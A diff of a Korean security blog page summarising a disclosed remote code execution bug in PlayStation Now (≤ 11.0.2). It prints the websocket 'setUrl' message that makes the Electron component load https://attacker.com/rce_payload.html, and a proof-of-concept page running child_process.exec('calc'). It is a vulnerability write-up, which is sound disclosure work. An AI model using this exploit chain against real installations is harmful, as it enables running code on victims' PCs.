@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      336 자
+      603 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      12
        분
     </span>
   
@@ -241,34 +241,33 @@
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p>
-<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now ≤ 11.0.2</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>게임 스트리밍 서비스 PlayStation Now에서 원격 코드 실행 취약점이 발견되었습니다.<br><br><br>PS Now의 주요 구성요소로는 QAS와 AGL이 있습니다. QAS는 Qt5 프레임워크로 개발된  <code>psnowlauncher.exe</code> 실행파일이며 PS Now의 메인 애플리케이션입니다.  AGL은 Electron 응용 프로그램이며 QAS에 의해 실행됩니다. 처음 로드할 페이지의 URL을 매개변수로 받아 실행이 가능합니다.<br><br><br><code>nodeIntegration</code>은 <code>Electron BrowserWindows</code>에서 실행되는 기능으로 javascript에서 Windows 프로세스를 생성할 수 있습니다. 기본값은 false지만 AGL에서는 true로 설정되어 있으며, AGL은 로드하는 URL 검증을 하지 않아 해커의 페이로드가 담긴 URL을 통해 javascript에서 임의 코드를 실행할 수 있습니다.<br><br><br>이 임의 코드 실행 취약점은 QAS에서 실행되는 로컬 웹 소켓 서버를 통해 원격으로 수행할 수 있습니다. 웹사이트가 다음 request를 로컬 웹 소켓 서버에 보내면 AGL에 로드된 URL을 QAS에서 실행합니다.  </p>
-<pre><code class="hljs json">&#123;
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now &#x2264; 11.0.2</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAC8C;&#xC784; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xC11C;&#xBE44;&#xC2A4; PlayStation Now&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>PS Now&#xC758; &#xC8FC;&#xC694; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB85C;&#xB294; QAS&#xC640; AGL&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. QAS&#xB294; Qt5 &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C; &#xAC1C;&#xBC1C;&#xB41C;  <code>psnowlauncher.exe</code> &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774;&#xBA70; PS Now&#xC758; &#xBA54;&#xC778; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC785;&#xB2C8;&#xB2E4;.  AGL&#xC740; Electron &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xBA70; QAS&#xC5D0; &#xC758;&#xD574; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C; &#xB85C;&#xB4DC;&#xD560; &#xD398;&#xC774;&#xC9C0;&#xC758; URL&#xC744; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC544; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.<br><br><br><code>nodeIntegration</code>&#xC740; <code>Electron BrowserWindows</code>&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; javascript&#xC5D0;&#xC11C; Windows &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xAC12;&#xC740; false&#xC9C0;&#xB9CC; AGL&#xC5D0;&#xC11C;&#xB294; true&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, AGL&#xC740; &#xB85C;&#xB4DC;&#xD558;&#xB294; URL &#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xB2F4;&#xAE34; URL&#xC744; &#xD1B5;&#xD574; javascript&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>&#xC774; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC740; QAS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xB2E4;&#xC74C; request&#xB97C; &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; AGL&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; URL&#xC744; QAS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.  </p>
+<pre><code class="hljs json">{
   <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,
-  <span class="hljs-attr">&quot;params&quot;</span>: &#123;
+  <span class="hljs-attr">&quot;params&quot;</span>: {
     <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>
-  &#125;,
+  },
   <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,
   <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>
-&#125;</code></pre>
+}</code></pre>
 
-<p>그러나 source와 target을 바꿔 URL을 AGL에서 로드할 수 있도록 구성하면 원격에서 AGL이 로드할 URL을 조작할 수 있습니다.<br><br><br>피해자의 컴퓨터에서 PS Now와 QAS, 로컬 웹 소켓이 실행 중일 경우 아래와 같은 방법으로 원격 코드 실행이 가능합니다.</p>
+<p>&#xADF8;&#xB7EC;&#xB098; source&#xC640; target&#xC744; &#xBC14;&#xAFD4; URL&#xC744; AGL&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD558;&#xBA74; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; AGL&#xC774; &#xB85C;&#xB4DC;&#xD560; URL&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>&#xD53C;&#xD574;&#xC790;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; PS Now&#xC640; QAS, &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13;&#xC774; &#xC2E4;&#xD589; &#xC911;&#xC77C; &#xACBD;&#xC6B0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li><p>브라우저로 해커의 웹사이트에 접속합니다.</p>
+<li><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB85C; &#xD574;&#xCEE4;&#xC758; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD569;&#xB2C8;&#xB2E4;.</p>
 </li>
-<li><p>웹 사이트는 피해자 PC의 웹 소켓 서버 <code>ws://localhost:1235</code> 에 연결됩니다.</p>
+<li><p>&#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xD53C;&#xD574;&#xC790; PC&#xC758; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84; <code>ws://localhost:1235</code> &#xC5D0; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</p>
 </li>
-<li><p>웹사이트는 웹 소켓 서버에 다음과 같은 메시지를 보냅니다. </p>
- <pre><code class="hljs json">&#123;
+<li><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xC5D0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p>
+ <pre><code class="hljs json">{
 	<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,
-	<span class="hljs-attr">&quot;params&quot;</span>:&#123;
+	<span class="hljs-attr">&quot;params&quot;</span>:{
 		<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>
-	&#125;,
+	},
 	<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,
 	<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>
-&#125;</code></pre>
-</li>
-<li><p>AGL은 <code>https://attacker.com/rce_payload.html</code> 를 로드합니다. 이때 <code>rce_payload.html</code>의 javascript 코드가 피해자의 PC에서 실행됩니다.</p>
+}</code></pre></li>
+<li><p>AGL&#xC740; <code>https://attacker.com/rce_payload.html</code> &#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>rce_payload.html</code>&#xC758; javascript &#xCF54;&#xB4DC;&#xAC00; &#xD53C;&#xD574;&#xC790;&#xC758; PC&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
  <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>
 &lt;html&gt;
     &lt;head&gt;
@@ -276,8 +275,8 @@
     &lt;/head&gt;
     &lt;body&gt;
         &lt;script&gt;
-            <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)
-            .exec(<span class="hljs-string">&#x27;calc&#x27;</span>)
+            <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>)
+            .exec(<span class="hljs-string">&apos;calc&apos;</span>)
         &lt;/script&gt;
     &lt;/body&gt;
 &lt;/html&gt;</code></pre></li>
@@ -584,6 +583,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
